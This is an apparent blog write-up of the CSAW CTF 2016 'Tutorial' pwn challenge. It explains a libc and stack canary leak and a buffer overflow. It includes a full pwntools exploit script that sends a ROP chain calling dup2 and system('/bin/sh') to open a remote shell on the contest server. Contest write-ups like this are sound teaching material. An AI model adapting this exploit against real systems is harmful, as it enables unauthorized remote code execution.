<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>CSAW CTF 2016: Tutorial (pwn 200) | Isaac's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives" class="sidebar-nav-item">Archives</a><a href="/about" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>CSAW CTF 2016: Tutorial (pwn 200)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2016-09-29</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/CSAW-CTF/">CSAW CTF</a>/<a class="post-tag-link" href="/tags/ROP/">ROP</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a>/<a class="post-tag-link" href="/tags/x86-64/">x86-64</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.<br>nc pwn.chal.csaw.io 8002<br><a href="/2016/09/29/tutorial/tutorial" title="tutorial">tutorial</a> <a href="/2016/09/29/tutorial/libc-2.19.so" title="libc-2.19.so">libc-2.19.so</a></p>
</blockquote>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>A socket server</li>
<li>Obvious leak of libc address and stack canary + provided libc library + stack buffer overflow</li>
<li>ROP attack (<code>dup2</code>, <code>dup2</code>, <code>system(&quot;/bin/sh&quot;)</code>)</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The direct execution of <code>tutorial</code> will crash. So, I inspect the binary with IDA Pro and found that this is a TCP server which requires a port number as the argument and a user call <code>tutorial</code> exists in the system. After slightly patching the program and providing the port number, I can run the program on my computer. Connecting to the server, it displays three options.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>-Tutorial-<br>1.Manual<br>2.Practice<br>3.Quit<br>&gt;<br></pre></td></tr></table></figure>
<p>The first option <code>1.Manual</code> prints an address <code>Reference:0x7fad235d3860</code>, which is the address of <code>puts - 1280</code>. Together with the provided <code>libc-2.19.so</code>, it allows us to caculate the address of other functions in the libc.</p>
<p>The second option <code>2.Practice</code> asks us to input our exploit. Sending some random input, it seems to echo our input with some extra binary data in the end.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>&gt;2<br>Time to test your exploit...<br>&gt;abc<br>abc<br>��g�]�p�g/�-<br></pre></td></tr></table></figure>
<p>It turns out that these binary data are stack canary and part of the <code>rbp</code>. With the knowledge of stack canary and the address of functions in libc, now we can make use of the stack buffer overflow vulnerability of option 2 to conduct the ROP attack.</p>
<p>Notice that the server interacts with us via socket instead of standard input output. We can’t merely invoke the <code>system(&quot;/bin/sh&quot;)</code>, which opens a shell only on the server side. The most common solution is using <code>dup2</code> to duplicate the file descriptor of socket connection to standard input and output before calling <code>system</code>. There are three ways to find out the file descriptor of the connection:</p>
<ol>
<li>Educated guess. Functions usually return the lowest possible file descriptor. Standard input, output, and error are 0, 1, and 2 respectively. <code>socket</code> may return 3. Then <code>accept</code> is likely to return 4.</li>
<li>Leak stack buffer. Since we can leak the lower four bytes of <code>rbp</code>, we can easily guess the address of stack and leak the file descriptor stored in it.</li>
<li><code>ls -l /proc/&lt;pid&gt;/fd</code>. Execute the program locally and inspect what file descriptors are being used.</li>
</ol>
<p>The script is as follows.<br><figure class="highlight python"><figcaption><span>tutorial_exp.py</span><a href="/2016/09/29/tutorial/tutorial_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-comment"># ROP gadget</span><br>pop_rsi_r15 = <span class="hljs-number">0x4012e1</span><br>pop_rdi = <span class="hljs-number">0x4012e3</span><br><br>puts_base = <span class="hljs-number">0x6fd60</span><br>system_base = <span class="hljs-number">0x46590</span><br>bin_sh_base = <span class="hljs-number">0x17c8c3</span><br>dup2_base = <span class="hljs-number">0xebe90</span><br><br>r = remote(<span class="hljs-string">'pwn.chal.csaw.io'</span>, <span class="hljs-number">8002</span>)<br><br><span class="hljs-comment"># leak libc address</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'1'</span>)<br>line = r.recvline()[:<span class="hljs-number">-1</span>]<br><span class="hljs-keyword">print</span> line<br>puts_addr = int(line[<span class="hljs-number">-14</span>:], <span class="hljs-number">16</span>) + <span class="hljs-number">1280</span><br>libc_addr = puts_addr - puts_base<br>system_addr = libc_addr + system_base<br>bin_sh_addr = libc_addr + bin_sh_base<br>dup2_addr = libc_addr + dup2_base<br><br><span class="hljs-comment"># leak canary</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'2'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.send(<span class="hljs-string">' '</span>)<br>sleep(<span class="hljs-number">0.2</span>)<br>data = r.recv()<br>canary = data[<span class="hljs-number">-12</span>:<span class="hljs-number">-4</span>]<br><span class="hljs-keyword">print</span> repr(data)<br><br><span class="hljs-comment"># ROP payload</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'2'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">312</span> + canary + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi_r15) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(dup2_addr) <span class="hljs-comment"># dup2(4, 0)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi_r15) + p64(<span class="hljs-number">1</span>) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(dup2_addr) <span class="hljs-comment"># dup2(4, 1)</span><br>payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)                         <span class="hljs-comment"># system("/bin/sh")</span><br>r.send(payload)<br><br>r.interactive()<br></pre></td></tr></table></figure></p>
<blockquote>
<p>Flag: <code>FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}</code></p>
</blockquote>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
<li><strong>What I’ve learned:</strong><ul>
<li>Using <code>dup2</code> to get the interactive shell of socket server.</li>
<li>There is no need to inject the string <code>/bin/sh</code> to somewhere in the buffer as I first did. This string is containing in the libc, and its offset can be found by <code>strings -t x libc-2.19.so | grep &quot;/bin/sh&quot;</code></li>
</ul>
</li>
<li>This server using <code>fork</code> to create a new process to handle the new user’s request, so the base address of <code>libc</code> and the value of stack canary remain the same from request to request. There is no need to automatically parse these value during the contest. Just hard code them in the script to save some time.</li>
</ul>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2016/09/29/tutorial/';
var disqus_title = 'CSAW CTF 2016: Tutorial (pwn 200)';
var disqus_url = 'http://poning.me/2016/09/29/tutorial/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2016 <a href="/" rel="nofollow">Isaac's Blog</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});</script></body></html>